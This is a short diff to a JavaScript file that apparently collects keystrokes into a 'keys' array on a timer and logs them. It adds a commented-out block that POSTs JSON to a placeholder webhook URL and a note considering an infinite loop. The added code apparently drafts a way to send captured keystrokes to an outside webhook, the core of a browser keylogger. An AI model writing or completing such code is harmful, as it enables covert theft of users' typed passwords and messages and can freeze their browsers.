@@ -13,3 +13,28 @@ window.setInterval(function() {
   }
 }, 500);
 console.log(keys);
+
+
+
+/* 
+
+var webhook = ' WEBHOOK URL';
+
+var request = new XMLHttpRequest();
+      request.open("POST", webhook);
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+
+      var params = {
+        username: "My Webhook Name",
+        avatar_url: "",
+        content: "The message to send"
+      }
+
+      request.send(JSON.stringify(params));
+
+  }
+
+    */
+//maybe put a infinite loop?
